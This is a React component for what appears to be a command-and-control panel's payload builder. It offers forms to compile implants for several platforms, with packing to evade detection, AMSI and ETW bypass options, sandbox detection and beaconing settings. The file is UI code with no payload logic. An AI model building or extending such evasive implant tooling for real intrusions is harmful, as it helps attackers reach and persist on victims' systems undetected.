"use client"
import { apiFetch } from "@c2panel/core/api/fetch"

import { useState, useCallback, useEffect } from "react"
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Switch } from "@/components/ui/switch"
import { Checkbox } from "@/components/ui/checkbox"
import { Slider } from "@/components/ui/slider"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogClose,
} from "@/components/ui/dialog"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { Separator } from "@/components/ui/separator"
import {
  Plus,
  Download,
  Trash2,
  RefreshCw,
  Package,
  FileCode2,
  Shield,
} from "lucide-react"
import { toast } from "sonner"

/* ------------------------------------------------------------------ */
/*  Types                                                              */
/* ------------------------------------------------------------------ */

type PayloadStatus = "pending" | "building" | "ready" | "failed"

interface Payload {
  id: string
  name: string
  type: string
  description?: string
  status: PayloadStatus
  config: any
  downloadUrl?: string
  sizeBytes?: number
  buildLogs: string[]
  errorMessage?: string
  createdAt: number
  updatedAt: number
  completedAt?: number
}

/* ------------------------------------------------------------------ */
/*  Component                                                          */
/* ------------------------------------------------------------------ */

export function PayloadsView() {
  const [payloads, setPayloads] = useState<Payload[]>([])
  const [loading, setLoading] = useState(true)
  const [generateOpen, setGenerateOpen] = useState(false)
  const [generating, setGenerating] = useState(false)
  const [form, setForm] = useState({
    name: "",
    type: "windows_exe",
    description: "",
    platform: "windows",
    packingMethod: "none",
    compressionLevel: 5,
    obfuscation: true,
    antiAnalysis: true,
    obfuscationLevel: "medium",
    obfuscationTechniques: {
      amsi_bypass: false,
      etw_bypass: false,
      string_encode: true,
      variable_rename: true,
    },
  })

  // Fetch payloads on mount
  useEffect(() => {
    fetchPayloads()
  }, [])

  const fetchPayloads = async () => {
    try {
      const response = await apiFetch("/api/admin/security/payloads")
      if (!response.ok) throw new Error("Failed to fetch payloads")
      const data = await response.json()
      setPayloads(data.builds || [])
    } catch (error) {
      console.error("Failed to fetch payloads:", error)
      toast.error("Failed to load payloads")
    } finally {
      setLoading(false)
    }
  }

  const handleGenerate = useCallback(async () => {
    if (!form.name.trim()) return
    setGenerating(true)

    try {
      const payloadConfig = {
        hysteriaConfig: {
          server: "auto-detect",
          auth: "auto-generate",
        },
        platform: form.platform,
        packing: {
          method: form.packingMethod,
          compressionLevel: form.packingMethod !== "none" ? form.compressionLevel : undefined,
        },
        obfuscation: {
          enabled: form.obfuscation,
          level: form.obfuscationLevel,
          techniques: form.obfuscation
            ? Object.entries(form.obfuscationTechniques)
                .filter(([_, enabled]) => enabled)
                .map(([tech]) => tech)
            : [],
        },
        signing: {
          enabled: false,
        },
        features: {
          autoReconnect: true,
          heartbeat: 30,
          fallbackServers: [],
          antiAnalysis: form.antiAnalysis,
        },
      }

      const response = await apiFetch("/api/admin/security/payloads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: form.name,
          type: form.type,
          description: form.description,
          config: payloadConfig,
        }),
      })

      if (!response.ok) throw new Error("Failed to create payload build")

      const build = await response.json()

      // Start the build process
      const buildResponse = await apiFetch(`/api/admin/security/payloads/${build.id}/build`, {
        method: "POST",
      })

      if (!buildResponse.ok) throw new Error("Failed to start build")

      toast.success("Payload generation started", {
        description: `${form.name} is being compiled…`,
      })

      setGenerateOpen(false)
      setForm({
        name: "",
        type: "windows_exe",
        description: "",
        platform: "windows",
        packingMethod: "none",
        compressionLevel: 5,
        obfuscation: true,
        antiAnalysis: true,
        obfuscationLevel: "medium",
        obfuscationTechniques: {
          amsi_bypass: false,
          etw_bypass: false,
          string_encode: true,
          variable_rename: true,
        },
      })

      // Refresh the list
      await fetchPayloads()
    } catch (error) {
      console.error("Failed to generate payload:", error)
      toast.error("Failed to generate payload")
    } finally {
      setGenerating(false)
    }
  }, [form])

  const handleDownload = useCallback(async (payload: Payload) => {
    if (payload.status !== "ready") {
      toast.error("Payload not ready", { description: "Wait for the build to complete." })
      return
    }
    
    if (payload.downloadUrl) {
      window.open(payload.downloadUrl, "_blank")
      toast.success("Download started", {
        description: `Downloading ${payload.name}…`,
      })
    } else {
      toast.error("No download URL available")
    }
  }, [])

  const handleDelete = useCallback(async (payloadId: string) => {
    try {
      const response = await apiFetch(`/api/admin/security/payloads/${payloadId}`, {
        method: "DELETE",
      })

      if (!response.ok) throw new Error("Failed to delete payload")

      toast.success("Payload deleted")
      await fetchPayloads()
    } catch (error) {
      console.error("Failed to delete payload:", error)
      toast.error("Failed to delete payload")
    }
  }, [])

  const handleRebuild = useCallback(async (payload: Payload) => {
    try {
      const response = await apiFetch(`/api/admin/security/payloads/${payload.id}/build`, {
        method: "POST",
      })

      if (!response.ok) throw new Error("Failed to start rebuild")

      toast.info("Rebuilding payload…", { description: payload.name })
      await fetchPayloads()
    } catch (error) {
      console.error("Failed to rebuild payload:", error)
      toast.error("Failed to rebuild payload")
    }
  }, [])

  // Stats
  const readyCount = payloads.filter((p) => p.status === "ready").length
  const buildingCount = payloads.filter((p) => p.status === "building").length
  const failedCount = payloads.filter((p) => p.status === "failed").length

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <RefreshCw className="h-6 w-6 animate-spin text-muted-foreground" />
      </div>
    )
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-heading-xl">Dynamic Payload Generation</h1>
        <p className="mt-1 text-body-sm text-muted-foreground">
          Generate and manage custom payloads for various platforms and scenarios.
        </p>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
        <Card>
          <CardContent className="flex items-center gap-3 p-4">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10">
              <Package className="h-4 w-4 text-primary" />
            </div>
            <div>
              <p className="text-heading-lg">{payloads.length}</p>
              <p className="text-caption text-muted-foreground">Total Payloads</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="flex items-center gap-3 p-4">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-success/10">
              <FileCode2 className="h-4 w-4 text-success" />
            </div>
            <div>
              <p className="text-heading-lg">{readyCount}</p>
              <p className="text-caption text-muted-foreground">Ready</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="flex items-center gap-3 p-4">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-warning/10">
              <RefreshCw className="h-4 w-4 text-warning" />
            </div>
            <div>
              <p className="text-heading-lg">{buildingCount}</p>
              <p className="text-caption text-muted-foreground">Building</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="flex items-center gap-3 p-4">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-destructive/10">
              <Shield className="h-4 w-4 text-destructive" />
            </div>
            <div>
              <p className="text-heading-lg">{failedCount}</p>
              <p className="text-caption text-muted-foreground">Failed</p>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Payloads list */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle>Payload Builds</CardTitle>
              <CardDescription>Generated implant payloads with build status</CardDescription>
            </div>
            <Dialog open={generateOpen} onOpenChange={setGenerateOpen}>
              <DialogTrigger render={<Button />}>
                <Plus className="mr-2 h-4 w-4" />
                Generate New Payload
              </DialogTrigger>
              <DialogContent className="sm:max-w-2xl max-h-[90vh] overflow-y-auto">
                <DialogHeader>
                  <DialogTitle>Generate New Payload</DialogTitle>
                  <DialogDescription>
                    Configure and compile a new implant payload with advanced stealth features.
                  </DialogDescription>
                </DialogHeader>
                <div className="space-y-4 py-2">
                  <div className="space-y-2">
                    <Label htmlFor="pl-name">Payload Name</Label>
                    <Input
                      id="pl-name"
                      placeholder="e.g. Corp-Win-Stager"
                      value={form.name}
                      onChange={(e) => setForm((f) => ({ ...f, name: e.target.value }))}
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label>Payload Type</Label>
                      <Select value={form.type} onValueChange={(v) => setForm((f) => ({ ...f, type: v ?? f.type }))}>
                        <SelectTrigger>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="windows_exe">Windows Executable (.exe)</SelectItem>
                          <SelectItem value="linux_elf">Linux ELF Binary</SelectItem>
                          <SelectItem value="macos_app">macOS App Bundle (.app)</SelectItem>
                          <SelectItem value="powershell">PowerShell Script (.ps1)</SelectItem>
                          <SelectItem value="python">Python Script (.py)</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>

                    <div className="space-y-2">
                      <Label>Platform</Label>
                      <Select value={form.platform} onValueChange={(v) => setForm((f) => ({ ...f, platform: v ?? f.platform }))}>
                        <SelectTrigger>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="windows">Windows</SelectItem>
                          <SelectItem value="linux">Linux</SelectItem>
                          <SelectItem value="macos">macOS</SelectItem>
                          <SelectItem value="cross-platform">Cross-Platform</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="pl-desc">Description (optional)</Label>
                    <Input
                      id="pl-desc"
                      placeholder="e.g. Corporate stager for initial access"
                      value={form.description}
                      onChange={(e) => setForm((f) => ({ ...f, description: e.target.value }))}
                    />
                  </div>

                  <Separator />

                  {/* Packing Configuration */}
                  <div className="space-y-3">
                    <div>
                      <Label>Packing Method</Label>
                      <p className="text-caption text-muted-foreground mt-1">
                        Compress and pack the payload to reduce size and evade detection
                      </p>
                    </div>
                    <Select value={form.packingMethod} onValueChange={(v) => setForm((f) => ({ ...f, packingMethod: v ?? f.packingMethod }))}>
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="none">No Packing</SelectItem>
                        <SelectItem value="upx">UPX (Ultimate Packer for eXecutables)</SelectItem>
                        <SelectItem value="custom">Custom Packer</SelectItem>
                      </SelectContent>
                    </Select>

                    {form.packingMethod !== "none" && (
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <Label>Compression Level</Label>
                          <span className="text-sm text-muted-foreground">{form.compressionLevel}</span>
                        </div>
                        <Slider
                          min={1}
                          max={9}
                          step={1}
                          value={[form.compressionLevel]}
                          onValueChange={(value) => setForm((f) => ({ ...f, compressionLevel: value[0] }))}
                        />
                        <div className="flex justify-between text-xs text-muted-foreground">
                          <span>Fast</span>
                          <span>Best</span>
                        </div>
                      </div>
                    )}
                  </div>

                  <Separator />

                  {/* Obfuscation Configuration */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-body-sm font-medium">Code Obfuscation</p>
                        <p className="text-caption text-muted-foreground">
                          Apply binary obfuscation techniques
                        </p>
                      </div>
                      <Switch
                        checked={form.obfuscation}
                        onCheckedChange={(v) => setForm((f) => ({ ...f, obfuscation: !!v }))}
                      />
                    </div>

                    {form.obfuscation && (
                      <>
                        <div className="space-y-2">
                          <Label>Obfuscation Level</Label>
                          <Select value={form.obfuscationLevel} onValueChange={(v) => setForm((f) => ({ ...f, obfuscationLevel: v ?? f.obfuscationLevel }))}>
                            <SelectTrigger>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="light">Light - Minimal overhead</SelectItem>
                              <SelectItem value="medium">Medium - Balanced</SelectItem>
                              <SelectItem value="heavy">Heavy - Maximum stealth</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>

                        <div className="space-y-2">
                          <Label>Obfuscation Techniques</Label>
                          <div className="space-y-2">
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="amsi-bypass"
                                checked={form.obfuscationTechniques.amsi_bypass}
                                onCheckedChange={(checked) =>
                                  setForm((f) => ({
                                    ...f,
                                    obfuscationTechniques: {
                                      ...f.obfuscationTechniques,
                                      amsi_bypass: !!checked,
                                    },
                                  }))
                                }
                              />
                              <Label
                                htmlFor="amsi-bypass"
                                className="text-sm font-normal cursor-pointer"
                              >
                                AMSI Bypass (Anti-Malware Scan Interface)
                              </Label>
                            </div>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="etw-bypass"
                                checked={form.obfuscationTechniques.etw_bypass}
                                onCheckedChange={(checked) =>
                                  setForm((f) => ({
                                    ...f,
                                    obfuscationTechniques: {
                                      ...f.obfuscationTechniques,
                                      etw_bypass: !!checked,
                                    },
                                  }))
                                }
                              />
                              <Label
                                htmlFor="etw-bypass"
                                className="text-sm font-normal cursor-pointer"
                              >
                                ETW Bypass (Event Tracing for Windows)
                              </Label>
                            </div>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="string-encode"
                                checked={form.obfuscationTechniques.string_encode}
                                onCheckedChange={(checked) =>
                                  setForm((f) => ({
                                    ...f,
                                    obfuscationTechniques: {
                                      ...f.obfuscationTechniques,
                                      string_encode: !!checked,
                                    },
                                  }))
                                }
                              />
                              <Label
                                htmlFor="string-encode"
                                className="text-sm font-normal cursor-pointer"
                              >
                                String Encoding
                              </Label>
                            </div>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="variable-rename"
                                checked={form.obfuscationTechniques.variable_rename}
                                onCheckedChange={(checked) =>
                                  setForm((f) => ({
                                    ...f,
                                    obfuscationTechniques: {
                                      ...f.obfuscationTechniques,
                                      variable_rename: !!checked,
                                    },
                                  }))
                                }
                              />
                              <Label
                                htmlFor="variable-rename"
                                className="text-sm font-normal cursor-pointer"
                              >
                                Variable Renaming
                              </Label>
                            </div>
                          </div>
                        </div>
                      </>
                    )}
                  </div>

                  <Separator />

                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-body-sm font-medium">Anti-Analysis</p>
                      <p className="text-caption text-muted-foreground">
                        VM / debugger / sandbox detection
                      </p>
                    </div>
                    <Switch
                      checked={form.antiAnalysis}
                      onCheckedChange={(v) => setForm((f) => ({ ...f, antiAnalysis: !!v }))}
                    />
                  </div>
                </div>
                <DialogFooter>
                  <DialogClose render={<Button variant="outline" />}>
                    Cancel
                  </DialogClose>
                  <Button
                    onClick={handleGenerate}
                    disabled={!form.name.trim() || generating}
                  >
                    {generating ? "Generating…" : "Generate Payload"}
                  </Button>
                </DialogFooter>
              </DialogContent>
            </Dialog>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-3">
            {payloads.length === 0 && (
              <p className="text-body-sm text-muted-foreground">No payloads generated yet.</p>
            )}
            {payloads.map((payload) => (
              <div
                key={payload.id}
                className="flex items-center justify-between rounded-lg border p-4 transition-colors hover:bg-muted/30"
              >
                <div className="flex items-center gap-3">
                  <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-muted">
                    <FileCode2 className="h-4 w-4 text-muted-foreground" />
                  </div>
                  <div>
                    <h3 className="text-heading-sm">{payload.name}</h3>
                    <p className="text-caption text-muted-foreground">
                      {payload.type} · {payload.sizeBytes ? `${(payload.sizeBytes / 1024 / 1024).toFixed(2)} MB` : "—"} · {new Date(payload.createdAt).toLocaleDateString()}
                    </p>
                    {payload.errorMessage && (
                      <p className="text-caption text-destructive mt-1">{payload.errorMessage}</p>
                    )}
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <Badge
                    variant={
                      payload.status === "ready"
                        ? "default"
                        : payload.status === "building"
                          ? "secondary"
                          : payload.status === "failed"
                            ? "destructive"
                            : "outline"
                    }
                    className="gap-1.5"
                  >
                    <span
                      className={`h-1.5 w-1.5 rounded-full ${
                        payload.status === "ready"
                          ? "bg-success"
                          : payload.status === "building"
                            ? "bg-warning animate-pulse"
                            : payload.status === "failed"
                              ? "bg-destructive"
                              : "bg-muted-foreground"
                      }`}
                    />
                    {payload.status}
                  </Badge>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => handleDownload(payload)}
                    disabled={payload.status !== "ready"}
                  >
                    <Download className="mr-1.5 h-3 w-3" />
                    Download
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => handleRebuild(payload)}
                    disabled={payload.status === "building"}
                  >
                    <RefreshCw className="mr-1.5 h-3 w-3" />
                    Rebuild
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => handleDelete(payload.id)}
                    className="text-destructive hover:text-destructive"
                  >
                    <Trash2 className="h-3 w-3" />
                  </Button>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
